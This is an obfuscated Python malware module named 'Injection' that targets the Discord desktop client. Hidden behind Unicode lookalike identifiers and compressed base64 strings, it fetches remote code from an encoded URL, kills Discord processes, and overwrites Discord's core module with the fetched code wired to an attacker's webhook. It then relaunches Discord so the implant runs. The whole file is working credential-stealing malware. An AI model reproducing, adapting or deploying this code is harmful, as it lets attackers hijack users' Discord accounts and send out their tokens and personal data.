import os
import re
import subprocess
import psutil
import requests

class Injection:

    def __init__(self, webhook):
        𝘀𝘦𝙩𝘢𝘁𝙩𝙧(𝙨𝘦𝗹𝙛, 'appdata', 𝙤𝙨.getenv(__𝘪𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝘴𝘦𝙩𝙖𝘁𝙩𝙧(𝘀𝘦𝙡𝘧, 'discord_dirs', [𝙨𝘦𝘭𝗳.appdata + __𝙞𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\xb4\x05\x00\x1a\x91\x04\x17')).decode(), 𝘀𝗲𝙡𝘧.appdata + __𝘪𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x89\x0c7\xcdH\xce\xcb\xb6\x05\x00G\xea\x06\xe5')).decode(), 𝘴𝙚𝗹𝗳.appdata + __𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\n\x0cs\xf5\xb4\x05\x00.M\x05M')).decode(), 𝘴𝙚𝗹𝙛.appdata + __𝙞𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x8d\x8a\x88\xcaIr\xb7,O\n\x0f+Mq\xb4\xb5\x05\x00\x8c\xa1\t\x94')).decode()])
        𝘀𝙚𝘵𝘢𝙩𝘁𝗿(𝘀𝗲𝘭𝗳, 'code', 𝘳𝘦𝙦𝘶𝘦𝘴𝙩𝘴.get(__𝗶𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x05\xc1;\x0e\x84 \x10\x00\xd0+)\xfbI(\xf7\x13\xa5\x00\x92\xa5`\x81\xce\x19\x0b\t\x83\x99B1\xee\xe9\xf7\xbdI\xb9\x0e\x95\xb9\xebS\x9e1\xe0\x9e\x04u\x93\xf2y\x0e\x96\xb0\xda\x06\xab#X?{\x14r\xd3b(i,\x87y?\x0e\xf3\x92\x04\xe1y\xc3\xea\x17\xc8=Ce\x8a\x17\xc7 \xae\r\xbe\x03C\x96-\xd6\xd4\xa3\xb0\xcb<\xfa\xa2+\xff\xfe\xe3$%v')).decode()).text)
        for 𝗽𝙧𝗼𝘤 in 𝙥𝘀𝙪𝘁𝙞𝘭.process_iter():
            if __𝗶𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb4\xb5\x05\x00\x1a\x8e\x03\xda')).decode() in 𝘱𝙧𝘰𝗰.name().lower():
                𝘱𝗿𝗼𝗰.kill()
        for 𝙙𝗶𝙧 in 𝘀𝙚𝙡𝘧.discord_dirs:
            if not 𝙤𝙨.path.exists(𝘥𝙞𝙧):
                continue
            if 𝘀𝙚𝗹𝙛.get_core(𝙙𝘪𝗿) is not None:
                with 𝘰𝗽𝗲𝙣(𝙨𝘦𝙡𝗳.get_core(𝗱𝗶𝙧)[𝘪𝘯𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 958 - (𝗶𝗻𝘵(𝗢) + 𝗶), 𝘮𝘢𝙥(__𝙞𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝗶𝘁𝙚𝗿(__𝙞𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝘦(0)), __𝙞𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝙞𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode(), __𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝗶𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                    𝙛.write(𝙨𝙚𝗹𝗳.code.replace(__𝙞𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\r\xb4\xb5\x05\x00\xb4R\n\xd5')).decode(), 𝘴𝗲𝙡𝙛.get_core(𝙙𝗶𝘳)[𝙞𝗻𝘵.from_bytes(𝘮𝗮𝗽(lambda O, i: 468 - (𝙞𝙣𝘁(𝘖) + 𝙞), 𝘮𝙖𝗽(__𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝙩𝘦𝘳(__𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3s\x894\x06\x00\x02\xed\x01\x1f')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝙚(1)), __𝗶𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]).replace(__𝗶𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\nKq\x0b\xcc\xce\x08\x081(\xce\x01\x00\x1a;\x04"')).decode(), 𝘄𝗲𝙗𝗵𝙤𝙤𝘬))
                    𝘴𝙚𝘭𝙛.start_discord(𝙙𝙞𝘳)

    def get_core(self, dir):
        for 𝗳𝘪𝙡𝙚 in 𝙤𝘴.listdir(𝗱𝘪𝘳):
            if 𝘳𝙚.search(__𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝙛𝘪𝗹𝗲):
                𝘮𝗼𝙙𝘶𝗹𝘦𝘴 = 𝗱𝗶𝗿 + __𝙞𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗳𝙞𝘭𝘦 + __𝙞𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8bp7,\x8b\xf2\x08+\x8e\x8a\xf0\xb5\x05\x00\x19\x9b\x03\xee')).decode()
                if not 𝙤𝘀.path.exists(𝘮𝗼𝘥𝘂𝗹𝙚𝙨):
                    continue
                for 𝙛𝙞𝘭𝙚 in 𝘰𝘀.listdir(𝙢𝘰𝘥𝘶𝗹𝙚𝘴):
                    if 𝗿𝘦.search(__𝘪𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\xae\xb2\xb0\x05\x00\xb4\xbb\n\xf7')).decode(), 𝘧𝗶𝗹𝘦):
                        𝘤𝗼𝘳𝗲 = 𝗺𝗼𝘥𝘶𝗹𝗲𝘴 + __𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙛𝗶𝗹𝗲 + __𝗶𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝗶𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r\xb5\x05\x00\x8aI\t\x86')).decode()
                        if not 𝙤𝙨.path.exists(𝘤𝙤𝙧𝗲 + __𝗶𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode()):
                            continue
                        return (𝘤𝘰𝗿𝘦, 𝘧𝙞𝙡𝘦)

    def start_discord(self, dir):
        𝘶𝙥𝙙𝘢𝘁𝙚 = 𝘥𝙞𝙧 + __𝙞𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0b+\x8frw3\x88\n6\xcdIu\x0f\xb5\x05\x00+\xd9\x05\x0f')).decode()
        𝗲𝘹𝗲𝗰𝘂𝙩𝗮𝙗𝙡𝗲 = 𝗱𝘪𝙧.split(__𝗶𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode())[-𝙞𝙣𝘵.from_bytes(𝗺𝙖𝗽(lambda O, i: 759 - (𝙞𝘯𝘵(𝙊) + 𝙞), 𝘮𝗮𝗽(__𝙞𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝘵𝘦𝙧(__𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xab\n5\x01\x00\x03\x88\x01R')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝘦(1)), __𝗶𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xc9\r3\x89\n\xb4\xb5\x05\x00\x0b}\x02i')).decode()
        for 𝗳𝙞𝗹𝙚 in 𝘰𝙨.listdir(𝙙𝘪𝘳):
            if 𝙧𝗲.search(__𝙞𝗺𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝗳𝘪𝙡𝘦):
                𝘢𝙥𝘱 = 𝘥𝗶𝘳 + __𝘪𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝘧𝗶𝗹𝙚
                if 𝘰𝘀.path.exists(𝗮𝘱𝙥 + __𝗶𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\n\xb7\xccN\t\xaf\xc8I.\xb7\xb5\x05\x00\x1cs\x04Q')).decode()):
                    for 𝙛𝙞𝙡𝘦 in 𝙤𝙨.listdir(𝗮𝗽𝘱):
                        if 𝗳𝙞𝗹𝘦 == 𝙚𝙭𝘦𝙘𝙪𝘵𝘢𝘣𝙡𝘦:
                            𝗲𝘹𝗲𝘤𝘂𝘵𝘢𝘣𝘭𝘦 = 𝙖𝙥𝘱 + __𝙞𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙚𝘹𝙚𝘤𝘶𝘵𝗮𝙗𝘭𝗲
                            𝘀𝙪𝙗𝗽𝘳𝙤𝗰𝙚𝘀𝙨.call([𝘶𝗽𝘥𝗮𝘵𝗲, __𝘪𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\t6,O\xce\xb5\xcc\x8a\x8a\xf0\xab\n5\x0e\xcaH\xce\x0b\xb4\x05\x00G\xa5\x06\xd6')).decode(), 𝙚𝘹𝗲𝗰𝙪𝘁𝘢𝘣𝗹𝙚], shell=True, stdout=𝘀𝘶𝘣𝗽𝙧𝗼𝗰𝙚𝘴𝘀.PIPE, stderr=𝙨𝙪𝘣𝘱𝗿𝗼𝘤𝗲𝙨𝘀.PIPE)